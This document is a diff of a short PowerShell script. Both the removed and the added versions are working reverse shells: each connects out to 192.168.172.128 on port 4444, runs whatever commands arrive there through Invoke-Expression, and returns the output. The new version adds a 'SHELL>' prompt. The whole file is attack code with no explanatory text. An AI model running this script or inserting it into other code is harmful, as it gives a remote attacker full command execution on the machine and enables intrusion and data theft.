@@ -1,11 +1,7 @@
-$LHOST = "192.168.172.128"; $LPORT = 4444; 
-$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
-$NetworkStream = $TCPClient.GetStream(); 
-$StreamReader = New-Object IO.StreamReader($NetworkStream); 
-$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
-$StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024;
-while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
-$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; 
-if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
-$StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); 
-$StreamWriter.Close()
+$TCPClient = New-Object Net.Sockets.TCPClient('192.168.172.128', 4444);
+$NetworkStream = $TCPClient.GetStream();
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
+function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');
+$StreamWriter.Flush()}WriteToStream '';
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
+$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
